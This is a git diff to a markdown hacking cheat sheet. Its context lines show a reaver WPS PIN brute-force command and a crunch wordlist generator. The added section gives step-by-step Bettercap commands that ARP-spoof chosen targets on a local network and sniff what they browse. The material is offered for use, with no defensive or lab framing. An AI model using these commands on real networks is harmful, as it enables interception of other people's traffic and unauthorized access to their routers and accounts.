@@ -167,13 +167,36 @@ crunch {key_length Ex: 6 8} {char_used Ex: abc12} -o {.txt} -t {patter Ex: a@@@@
 wash --interface wlan0
 ```
 
->[!WARNING]\
+>[!WARNING]
 >Current version of reaver have some bugs, you can use old version
 
 > ## Brute force the pin attack
 ```sh
 reaver --bssid {router_MAC_add} --channel {channel_no.} --interface wlan0 -vvv --no-associate 
 ```
+---
+---
+---
+# Bettercap
+```sh
+sudo bettercap -iface wlx242fd0da04dc
+```
+```sh
+set arp.spoof.fullduplex true
+```
+```sh
+net.show
+```
+```sh
+set arp.spoof.targets <target_ip>
+```
+```sh
+arp.spoof on
+```
+for scan target browsed
+```sh
+net.sniff on 
+```
 
-# =}> [Keep Supporting me on YouTube](https://www.youtube.com/@ohm_vishwa)
+<!-- # =}> [Keep Supporting me on YouTube](https://www.youtube.com/@ohm_vishwa) -->
 
